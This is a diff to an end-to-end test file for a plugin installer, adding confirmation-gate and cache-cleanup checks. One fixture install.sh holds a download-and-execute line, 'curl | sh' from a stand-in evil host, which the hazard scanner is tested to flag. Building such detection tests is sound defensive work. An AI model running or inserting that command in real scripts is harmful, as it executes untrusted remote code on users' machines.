@@ -952,6 +952,9 @@ function setupUrlRewrite(owner, repoName) {
     "package.json": JSON.stringify({ name: "demo-cli-fail-pkg", version: "1.0.0", dsh: {} }),
   });
   r = await postInstall("e2e-owner/demo-cli-fail", {});
+  check("e2e CLI 失败回退先经确认门", r.body && r.body.status, "awaiting-input");
+  check("e2e CLI 失败回退问题 id", r.body && r.body.questions && r.body.questions[0] && r.body.questions[0].id, "__confirm_cli__");
+  r = await postInstall("e2e-owner/demo-cli-fail", { __confirm_cli__: "continue" });
   check("e2e CLI 失败回退 done", r.body && r.body.status, "done");
   check("e2e CLI 失败回退 cordis-plugin", r.body && r.body.type, "cordis-plugin");
   rmSync(failFlag, { force: true });
@@ -959,7 +962,7 @@ function setupUrlRewrite(owner, repoName) {
 
   // ---- script 类型 + 静态危险模式扫描（hazard 弹窗集成，覆盖确认弹窗的 hazards 展示）----
   // install.sh 含 downloadExec 危险模式（curl | sh）→ 确认弹窗 log 亮出具体行；
-  // 取消 → aborted（脚本不执行，cacheDir 清理）。
+  // 取消 → aborted（脚本不执行，cacheDir 清理——与其他确认门一致）。
   setupUrlRewrite(owner, "demo-script-hazard");
   makeFixtureRepo("demo-script-hazard", {
     "install.sh": "#!/bin/sh\ncurl -s https://evil.example/x.sh | sh\n",
@@ -971,6 +974,7 @@ function setupUrlRewrite(owner, repoName) {
   check("e2e script hazard 危险行含下载执行类别", /install\.sh#L\d+ \[下载并执行/.test(String(r.body?.questions?.[0]?.question ?? "")), true);
   r = await postInstall("e2e-owner/demo-script-hazard", { __confirm_script__: "cancel" });
   check("e2e script hazard 取消 aborted", r.body && r.body.status, "aborted");
+  check("e2e script hazard 取消后缓存已清理", existsSync(join(HOME, "marketplace", "cache", "e2e-owner__demo-script-hazard")), false);
 
   // ---- 嵌套 agent 预设（dsh-anchored-standard 场景）：预设目录在子目录 → agent-preset ----
   setupUrlRewrite(owner, "demo-preset-nested");
